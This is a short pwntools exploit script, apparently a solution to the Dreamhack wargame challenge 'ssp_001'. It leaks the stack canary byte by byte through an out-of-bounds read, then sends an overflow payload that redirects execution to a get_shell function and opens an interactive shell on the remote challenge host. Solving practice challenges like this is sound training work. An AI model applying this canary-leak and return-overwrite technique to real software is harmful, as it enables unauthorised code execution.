from pwn import *

p = remote("host3.dreamhack.games",9661)
#p = process("./ssp_001")
e = ELF('./ssp_001')

menu = "[F]ill the box\n[P]rint the box\n[E]xit\n>"
canary = b'0x'
print(canary)
for i in range(131,128,-1):
    p.sendafter(menu,"P")
    p.sendlineafter(":",str(i))
    p.recvuntil("is : ")
    canary += p.recv(2)
    print(canary)
canary += b'00'
print(canary)
canary = int(canary,16)

payload =b''
payload += b'a'*(16*4)
payload += p32(canary)
payload += b'a'*8
payload += p32(e.symbols["get_shell"])

p.sendafter(menu,"E")
p.sendlineafter(":",str(90))
p.sendafter(":",payload)
   

p.interactive()


